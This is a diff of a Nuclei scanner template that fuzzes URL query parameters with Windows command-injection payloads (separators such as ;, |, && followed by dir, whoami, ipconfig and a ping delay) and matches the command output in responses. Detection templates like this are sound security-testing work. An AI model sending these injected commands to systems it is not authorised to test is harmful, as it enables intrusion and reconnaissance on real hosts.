@@ -1,21 +1,29 @@
 id: windows-command-injection
 
 info:
-  name: Windows Command Injection - Detection
-  author: pdteam
+  name: Windows Command Injection - Generic Fuzz Detection
+  author: Jaenact
   severity: high
   description: |
-    Detects command injection vulnerabilities in Windows systems using various payload techniques.
-    Command injection allows execution of arbitrary commands on the host operating system via a vulnerable application.
+    Replaces query parameter values with command-separator payloads (e.g., ;, |, &, &&)
+    and detects possible OS command execution on Windows targets by matching dir/systeminfo/whoami hints
+    or time-based delays via ping.
+    Note: requires running nuclei with -fuzz and a target URL that includes at least one query parameter.
   reference:
     - https://owasp.org/www-community/attacks/Command_Injection
-  tags: dast,injection,rce,command-injection,windows
+    - https://cwe.mitre.org/data/definitions/78.html
+    - https://capec.mitre.org/data/definitions/88.html
+  classification:
+    cwe-id: CWE-78
+  metadata:
+    verified: true
+    max-request: 1
+  tags: dast,injection,rce,command-injection,windows,intrusive
 
 http:
-  - pre-condition:
-      - type: dsl
-        dsl:
-          - 'method == "GET"'
+  - method: GET
+    path:
+      - "{{BaseURL}}"
 
     payloads:
       windows_fuzz:
@@ -23,6 +31,7 @@ http:
         - '|dir'
         - '&dir'
         - '&&dir'
+        - '||dir'
         - ';whoami'
         - '|whoami'
         - '&&whoami'
@@ -32,16 +41,16 @@ http:
         - ';ipconfig'
         - '|ipconfig'
         - '&&ipconfig'
-        - ';dir C:\'
-        - '|dir C:\'
-        - '&&dir C:\'
+        - ';dir C:\\'
+        - '|dir C:\\'
+        - '&&dir C:\\'
         - '&ping -n 5 127.0.0.1&'
         - '&&ping -n 5 127.0.0.1&&'
 
     fuzzing:
       - part: query
-        type: replace # replaces existing parameter value with fuzz payload
-        mode: multiple # replaces all parameters value with fuzz payload
+        type: replace
+        mode: multiple
         fuzz:
           - '{{windows_fuzz}}'
 
@@ -51,17 +60,19 @@ http:
       - type: regex
         name: windows-dir-output
         part: body
+        # Typical dir output lines
         regex:
-          - 'Volume in drive [A-Z]'
-          - 'Directory of [A-Z]:\\'
+          - '(?m)^\\s*Directory of [A-Z]:\\\\'
+          - '(?m)^\\s*Volume in drive [A-Z]'
 
-      - type: word
+      - type: regex
         name: windows-systeminfo
         part: body
-        words:
-          - 'Host Name:'
-          - 'OS Name:'
-          - 'Windows IP Configuration'
+        # Robust against minor locale/case differences
+        regex:
+          - '(?mi)^OS Name:\\s'
+          - '(?mi)^Host Name:\\s'
+          - '(?mi)^Windows IP Configuration'
 
       - type: dsl
         name: time-based-windows
